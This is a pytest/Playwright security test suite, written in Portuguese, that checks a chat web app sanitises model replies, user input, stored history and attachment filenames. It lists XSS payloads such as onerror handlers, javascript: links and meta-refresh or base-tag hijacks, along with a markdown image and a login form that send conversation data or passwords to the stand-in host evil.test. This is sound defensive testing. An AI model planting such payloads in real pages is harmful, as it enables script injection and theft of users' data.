import json

import pytest

playwright_api = pytest.importorskip("playwright.sync_api")

ATAQUES = {
    "script": "<script>window.__xss=1</script>",
    "img_onerror": '<img src=x onerror="window.__xss=1">',
    "svg_onload": '<svg onload="window.__xss=1"></svg>',
    "iframe_srcdoc": '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
    "iframe_remoto": '<iframe src="https://evil.test/"></iframe>',
    "link_javascript": "[clique aqui](javascript:window.__xss=1)",
    "link_data": "[x](data:text/html;base64,PHNjcmlwdD4xPC9zY3JpcHQ+)",
    "formulario": '<form action="https://evil.test/login"><input name=senha></form>',
    "imagem_markdown": "![x](https://evil.test/vaza?c=a-conversa)",
    "estilo_inline": '<div style="position:fixed;inset:0;background:red">cobre a tela</div>',
    "link_css": '<link rel="stylesheet" href="https://evil.test/x.css">',
    "meta_refresh": '<meta http-equiv="refresh" content="0;url=https://evil.test">',
    "base": '<base href="https://evil.test/">',
    "objeto": '<object data="https://evil.test/x.swf"></object>',
    "details_ontoggle": '<details open ontoggle="window.__xss=1">x</details>',
    "mathml": '<math><mi xlink:href="javascript:window.__xss=1">x</mi></math>',
    "texto_com_tag_quebrada": '<img src="x" onerror="window.__xss=1"',
    "entidades": "&lt;script&gt;window.__xss=1&lt;/script&gt;",
}

TAGS_PROIBIDAS = ("script, iframe, object, embed, form, input, textarea, select, base, meta, link, style, "
                  "svg, math, img, video, audio")

INSPECAO = (
    "() => {"
    " const raiz = document.querySelector('#messages');"
    f" const proibidos = raiz.querySelectorAll('{TAGS_PROIBIDAS}');"
    " const comEvento = [...raiz.querySelectorAll('*')]"
    ".filter(e => [...e.attributes].some(a => a.name.startsWith('on')));"
    " const comEstilo = raiz.querySelectorAll('[style]');"
    " const links = [...raiz.querySelectorAll('a[href]')]"
    ".map(a => ({ href: a.getAttribute('href'), rel: a.getAttribute('rel') }));"
    " return { proibidos: proibidos.length, comEvento: comEvento.length, comEstilo: comEstilo.length,"
    " links, xss: window.__xss };"
    " }"
)


def abrir(pagina, servidor, resposta):
    requisicoes_externas = []
    dialogos = []
    pagina.on("dialog", lambda d: (dialogos.append(d.message), d.dismiss()))
    pagina.route("**://evil.test/**", lambda rota: (requisicoes_externas.append(rota.request.url), rota.abort()))
    pagina.route("**/chat", lambda rota: rota.fulfill(
        status=200, content_type="application/json", body=json.dumps({"resposta": resposta})))
    pagina.goto(servidor + "/app")
    pagina.wait_for_selector("#promptInput")
    return requisicoes_externas, dialogos


def enviar(pagina, texto):
    pagina.fill("#promptInput", texto)
    pagina.click("#sendBtn")
    pagina.wait_for_selector(".msg--bot .markdown", state="attached")
    pagina.wait_for_timeout(500)


@pytest.mark.parametrize("nome", list(ATAQUES))
def test_resposta_maliciosa_do_modelo_nao_executa_nem_carrega_nada_externo(servidor, pagina, nome):
    externas, dialogos = abrir(pagina, servidor, ATAQUES[nome])
    enviar(pagina, "oi")

    resultado = pagina.evaluate(INSPECAO)
    assert resultado["xss"] is None, nome
    assert dialogos == [] and externas == [], nome
    assert resultado["proibidos"] == 0 and resultado["comEvento"] == 0 and resultado["comEstilo"] == 0, nome
    for link in resultado["links"]:
        assert link["href"].startswith(("http:", "https:", "mailto:", "#", "/")), link
        assert link["rel"] == "noopener noreferrer", link


def test_links_normais_continuam_funcionando_e_abrem_em_outra_aba(servidor, pagina):
    abrir(pagina, servidor, "Veja a [documentação](https://docs.python.org/3/) e `print(1)`.\n\n- item\n- outro")
    enviar(pagina, "oi")

    link = pagina.locator("#messages .markdown a").first
    assert link.get_attribute("href") == "https://docs.python.org/3/"
    assert link.get_attribute("target") == "_blank" and link.get_attribute("rel") == "noopener noreferrer"
    assert pagina.locator("#messages .markdown li").count() == 2


def test_texto_do_usuario_com_html_aparece_como_texto_na_conversa_e_no_historico(servidor, pagina):
    externas, _ = abrir(pagina, servidor, "ok")
    enviar(pagina, '<img src=x onerror="window.__xss=1"><script>window.__xss=1</script>')

    assert pagina.locator("#messages .msg--user img, #messages .msg--user script").count() == 0
    assert "<img" in pagina.locator("#messages .msg--user").inner_text()
    assert pagina.locator("#historyList img").count() == 0
    assert pagina.evaluate("() => window.__xss") is None and externas == []


def test_historico_adulterado_no_localstorage_tambem_e_sanitizado(servidor, pagina):
    malicioso = '<img src=x onerror="window.__xss=1"> [x](javascript:window.__xss=1)'
    mensagens = [{"role": "user", "content": "<b>oi</b>"}, {"role": "assistant", "content": malicioso}]
    conversas = {"1": {"id": "1", "title": '<img src=x onerror="window.__xss=1">', "ts": 1, "pinned": False,
                       "messages": mensagens}}
    pagina.add_init_script(f"localStorage.setItem('credix_landing_chats', {json.dumps(json.dumps(conversas))});")
    externas, dialogos = abrir(pagina, servidor, "ok")
    pagina.locator("#sidebarOpen").click()
    pagina.locator(".history-item__title").first.click()
    pagina.wait_for_selector(".msg--bot .markdown", state="attached")

    resultado = pagina.evaluate(INSPECAO)
    assert resultado["xss"] is None and resultado["proibidos"] == 0 and resultado["comEvento"] == 0
    assert pagina.locator("#historyList img").count() == 0 and dialogos == [] and externas == []


def test_nome_de_arquivo_anexado_com_html_e_exibido_como_texto(servidor, pagina):
    abrir(pagina, servidor, "ok")
    pagina.set_input_files("#fileInput", {"name": "<img src=x onerror=window.__xss=1>.txt", "mimeType": "text/plain",
                                          "buffer": b"conteudo"})
    pagina.wait_for_selector(".attach-tag")
    assert pagina.locator(".attach-tag img").count() == 0
    assert pagina.evaluate("() => window.__xss") is None
